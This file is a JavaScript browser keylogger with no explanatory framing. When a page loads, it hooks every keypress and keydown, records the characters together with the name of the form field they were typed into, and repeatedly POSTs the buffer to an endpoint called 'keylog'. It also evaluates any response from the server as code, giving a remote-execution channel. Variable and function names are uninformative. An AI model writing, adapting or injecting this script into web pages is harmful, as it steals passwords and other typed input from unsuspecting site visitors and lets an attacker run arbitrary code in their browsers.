window.onload = function (){
    var2 = ",";
    name = '';
    function make_xhr(){
        var xhr;
                try {
                    xhr = new XMLHttpRequest();
                } catch(e) {
                    try {
                        xhr = new ActiveXObject("Microsoft.XMLHTTP");
                    } catch(e) {
                        xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                    }
                }
                if(!xhr) {
                    throw "failed to create XMLHttpRequest";
                }
                return xhr;
            }
            
            xhr = make_xhr();
            xhr.onreadystatechange = function() {
                if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
                    eval(xhr.responseText);
                }
            }

    if (window.addEventListener){
        //console.log("first");
        document.addEventListener('keypress', function2, true);
        document.addEventListener('keydown', function1, true);
    }
    else if (window.attachEvent){
        //console.log("second");
        document.attachEvent('onkeypress', function2);
        document.attachEvent('onkeydown', function1);
    }
    else {
        //console.log("third");
        document.onkeypress = function2;
        document.onkeydown = function1;
    }
}

function function2(e)
{   
    try
    {  
        srcname = window.event.srcElement.name;
    }catch(error)
    {
        srcname = e.srcElement ? e.srcElement.name : e.target.name
        if (srcname == "")
        {
            srcname = e.target.name
        }
    }

    var3 = (e) ? e.keyCode : e.which;
    if (var3 == 0)
    {
        var3 = e.charCode
    }
    
    if (var3 != "d" && var3 != 8 && var3 != 9 && var3 != 13)
    {
        andxhr(encodeURIComponent(var3), srcname);
    }
}

function function1(e)
{
    try
    {  
        srcname = window.event.srcElement.name;
    }catch(error)
    {
        srcname = e.srcElement ? e.srcElement.name : e.target.name
        if (srcname == "")
        {
            srcname = e.target.name
        }
    }

    var3 = (e) ? e.keyCode : e.which;
    if (var3 == 9 || var3 == 8 || var3 == 13)
    {
        andxhr(encodeURIComponent(var3), srcname);
    }
    else if (var3 == 0)
    {
        
        text = document.getElementById(id).value;
        if (text.length != 0)
        {   
            andxhr(encodeURIComponent(text), srcname);
        }
    } 

}
function andxhr(key, inputName)
{   
    if (inputName != name)
    {
        name = inputName;
        var2 = ",";
    }
    var2= var2 + key + ",";
    xhr.open("POST", "keylog", true);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=utf-8");
    xhr.send(var2 + '&&' + inputName);
    
    if (key == 13 || var2.length > 3000)
    {
        var2 = ",";
    }
}